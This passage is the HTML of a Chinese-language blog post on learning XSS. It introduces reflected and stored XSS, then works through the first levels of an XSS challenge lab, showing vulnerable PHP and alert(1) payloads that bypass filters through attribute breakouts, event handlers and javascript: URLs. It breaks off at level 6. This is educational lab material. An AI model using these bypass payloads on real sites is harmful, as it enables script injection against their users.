@@ -1,0 +1,432 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>xss学习 | Hexo</title><meta name="keywords" content="web"><meta name="author" content="薯条"><meta name="copyright" content="薯条"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="xss学习"><meta name="application-name" content="xss学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="xss学习"><meta property="og:url" content="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/Sherlock.jpg"><meta property="article:author" content="薯条"><meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/Sherlock.jpg"><meta name="description" content="基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🔍 分享与热心帮助","🤝 喜欢团结协作","🏃 脚踏实地行动派","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: 薯条","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Hexo',
+  title: 'xss学习',
+  postAI: '',
+  pageFillDescription: '基础, 简介, 分类, xss挑战之旅, level-1, level-2, level-3, level-4, level-5, level-6, level-7, level-8, level-9, level-10, level-11, level-12, level-13, level-14, level-15, level-16基础简介网站中包含大量的动态内容以提高用户体验比过去要复杂得多所谓动态内容就是根据用户环境和需要应用程序能够输出相应的内容动态站点会受到一种名为跨站脚本攻击的威胁而静态站点则完全不受其影响恶意攻击者会在页面里插入恶意代码当用户浏览该页之时嵌入其中里面的代码会被执行从而达到恶意攻击用户的目的漏洞通常是通过的输出函数将代码输出到页面中通过用户本地浏览器执行的所以漏洞关键就是寻找参数未过滤的输出函数分类反射型非持久化攻击者事先制作好攻击链接需要欺骗用户自己去点击链接才能触发代码服务器中没有这样的页面和内容一般容易出现在搜索页面型由于危害较小我们将其归为反射型存储型持久化代码是存储在服务器中的如在个人信息或发表文章等地方加入代码如果没有过滤或过滤不严那么这些代码将储存到服务器中每当有用户访问该页面的时候都会触发代码执行这种非常危险容易造成蠕虫大量盗窃虽然还有种型但是也还是包括在存储型内挑战之旅靶场欢迎用户没有任何过滤直接弹出弹窗进入下一关没有找到和相关的结果搜索被双引号包含所以我们需要先包含双引号后再或者弹出弹窗进入下一关使用函数把预定义的字符转换为实体防止浏览器将其作为元素但是默认是只编码双引号的而且单引号无论如何都不转义预定义的字符是和号成为双引号成为单引号成为小于成为大于成为没有找到和相关的结果然后再点击一下输入框就成功了没有找到和相关的结果没有找到和相关的结果伪协议就是把后面的代码当来执行利用浏览器自动校正轻微语法错误没有找到和相关的结果该题有多种基本上只要把前几题改下大小写就可以了没有找到和相关的结果全转换成小写了大小写不管用但是可以双写绕过友情链接可以用实体来绕过过滤实体字符实体是用一个编号写入代码中来代替一个字符在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读您的链接不合法有没有友情链接友情链接在上题的基础上再添上就可以了没有找到和相关的结果当一个元素里面有两个时那么只有第一个属性会被浏览器解析而第二个属性会被忽略没有找到和相关的结果在里面进行修改就行和上题不同的是要在里面改这题在里面改就可以了或者考到了杂项不会指令用于包含外部的文件包含的内容将作为指定元素的子节点属性的值可以是一个表达式返回一个文件名默认情况下包含的文件需要包含在同一个域名下所以这题我们只需要包含第一题的漏洞就好了是把光标移到同一行的顶头回车是把光标移到下一行换行使用替身就是将或者当成空格使用在中这样是合法的',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-12 21:44:11',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/Sherlock.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.05rem;">CTF<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>2</sup></a><a href="/tags/web-mysql/" style="font-size: 1.05rem;">web mysql<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF-web/" style="font-size: 1.05rem;">前端 web<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 1.05rem;">后端<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">February 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">January 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">December 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">November 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/web/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web</span></a></span></div></div><h1 class="post-title" itemprop="name headline">xss学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-12T13:44:11.704Z" title="Updated 2024-02-12 21:44:11">2024-02-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为福建"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>福建</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"><header><a href="/tags/web/" tabindex="-1" itemprop="url">web</a><h1 id="CrawlerTitle" itemprop="name headline">xss学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">薯条</span><time itemprop="dateCreated datePublished" datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time><time itemprop="dateCreated datePublished" datetime="2024-02-12T13:44:11.704Z" title="Updated 2024-02-12 21:44:11">2024-02-12</time></header><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的</p>
+<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong></p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型XSS：&lt;非持久化&gt;</p>
+<p> 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。DOM型XSS由于危害较小，我们将其归为反射型XSS</p>
+<p>存储型XSS：&lt;持久化&gt;</p>
+<p>代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie(虽然还有种DOM型XSS，但是也还是包括在存储型XSS内)</p>
+<h2 id="xss挑战之旅"><a href="#xss挑战之旅" class="headerlink" title="xss挑战之旅"></a>xss挑战之旅</h2><p>靶场：<a target="_blank" rel="noopener" href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤，直接：<code>/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹出弹窗，进入下一关</p>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>$str</code>被双引号包含，所以我们需要先包含双引号后再xss：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，或者 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code> 弹出弹窗，进入下一关</p>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素</p>
+<p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p>
+<p>预定义的字符是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp; （和号）成为 &amp;amp;</span><br><span class="line">- &quot; （双引号）成为 &amp;quot;</span><br><span class="line">- &#x27; （单引号）成为 &#x27;</span><br><span class="line">- &lt; （小于）成为 &amp;lt;</span><br><span class="line">- &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&#39;onclick=&#39;alert(1)</code>r然后再点击一下输入框就成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;&#x27;onclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&quot;onclick=&quot;alert(1)</code></p>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>js伪协议：就是把<code>javascript:</code> :后面的代码当JavaScript来执行</p>
+<p>payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>，利用浏览器自动校正轻微语法错误</p>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 